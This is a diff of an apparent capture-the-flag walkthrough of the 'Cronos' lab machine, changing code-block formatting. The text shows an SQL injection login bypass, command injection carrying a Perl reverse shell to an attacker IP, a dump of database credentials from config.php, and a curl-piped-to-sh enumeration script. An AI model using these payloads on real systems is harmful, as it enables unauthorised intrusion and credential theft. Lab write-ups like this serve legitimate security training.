@@ -11,7 +11,8 @@ One of my favourite boxes this one...
 
 `nmap -sV -Pn --min-rate 10000 |tee -a cronos.txt`
 
-{% highlight ruby %}
+```
+
 Nmap scan report for 10.10.10.13
 Host is up (0.094s latency).
 Not shown: 997 filtered ports
@@ -28,18 +29,21 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-{% endhighlight %}
+
+```
 
 We see port 53 running, lets enumerate it...
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/retired/cronos# nslookup
 > server 10.10.10.13
 Default server: 10.10.10.13
 Address: 10.10.10.13#53
 > 10.10.10.13
 13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
-{% endhighlight %}
+
+```
 
 We can add cronos.htb to our /etc/hosts file.
 
@@ -47,7 +51,8 @@ Lets dig a little deeper...
 
 `dig -axfr cronos.htb @10.10.10.13`
 
-{% highlight ruby %}
+```
+
 ; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr cronos.htb @10.10.10.13
 ;; global options: +cmd
 cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
@@ -61,7 +66,8 @@ cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 
 ;; SERVER: 10.10.10.13#53(10.10.10.13)
 ;; WHEN: Fri Jan 24 20:42:44 EST 2020
 ;; XFR size: 7 records (messages 1, bytes 203)
-{% endhighlight %}
+
+```
 
 lets take a look now at http://admin.cronos.htb
 
@@ -69,17 +75,23 @@ Its a login page...
 We can try some well known weak credentials, they fail so lets try sqli login bypass
 
 In the username field type 
-{% highlight ruby %}
+
+```
+
 admin 'or 1=1# 
-{% endhighlight %}
+
+```
+
 sometimes blank password is ok, sometimes random input is required.
 Splendid, this gets us into the tracert webpage....we can try to inject commands here....
 
 use ; to add command after the ping one; for example:
 
-{% highlight ruby %}
+```
+
 8.8.8.8;perl -e 'use Socket;$i="10.10.14.19";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-{% endhighlight %}
+
+```
 
 the perl reverse shell works! we catch the reverse shell on 
 `nc -nlvp 6969`
@@ -88,7 +100,8 @@ the perl reverse shell works! we catch the reverse shell on
 
 Taking a look around we know there's always goodies in the config.php file if its available...
 
-{% highlight ruby %}
+```
+
 $ cat config.php                                                                                                   
 <?php                                                                                                              
    define('DB_SERVER', 'localhost');                                                                               
@@ -96,11 +109,13 @@ $ cat config.php
    define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');                                                                   
    define('DB_DATABASE', 'admin');                                                                                 
    $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE); 
-{% endhighlight %}
+
+```
 
 This may be very useful, we can check the mysql database to see if we can find any other creds.
 
-{% highlight ruby %}
+```
+
 $ mysql -u admin -p
 Enter password: kEjdbRigfBHUREiNSDs
 use admin  
@@ -113,14 +128,16 @@ users
 id      username        password
 1       admin   4f5fffa7b2340178a716e3832451e058
 $ 
-{% endhighlight %}
+
+```
 
 [g0tmi1k's linux privilege escalation guide is the Bible of linux enum](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/),
 
 one of the first commands I always run (after `sudo -l` and `sudo su`) is
 `find / -perm -u=s -type f 2>/dev/null`
 
-{% highlight ruby %}
+```
+
 find / -perm -u=s -type f 2>/dev/null
 /bin/ping
 /bin/umount
@@ -145,15 +162,20 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/newgidmap
 /usr/bin/gpasswd
 /usr/bin/passwd
-{% endhighlight %}
+
+```
 
 Its important to become well practiced in the techniqes, methods and commands g0tmilk covers. For convenience many folk suppliment this knowlege with using enumeration scripts.
 Theres a few good ones out there, [LinEnum.sh](https://github.com/rebootuser/LinEnum) is a good comprehensive one, but the one ive started using first recently is [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 
 We can use curl (when available on targets) to run the enumeration from our attacking machine.
-{% highlight ruby %}
+
+```
+
 curl 10.10.14.19/linpeas.sh |sh |tee -a enum.txt
-{% endhighlight %}
+
+```
+
 ...so we dont even upload the file to the target...neat trick...
 
 Whilst increasingly becomming my goto method of enum, when the conditions allow, its not actually needed here; the way forward is practically right in front of us.
@@ -167,7 +189,8 @@ we just need to modify the lhost and port settings.
 
 There's a few ways we can get the file to the target... we can copy'n'paste it into vi, we can use `wget` or `curl -O`
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/retired/cronos# nc -nlvp 31337
 listening on [any] 31337 ...
 connect to [10.10.14.19] from (UNKNOWN) [10.10.10.13] 56894
@@ -180,8 +203,8 @@ uid=0(root) gid=0(root) groups=0(root)
 51xxxxxxxxxxxxxxxxxxxxxxxxxxxx3b
 # cat /root/root.txt
 1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxa0
-{% endhighlight %}
 
+```
 
 #############################################
 
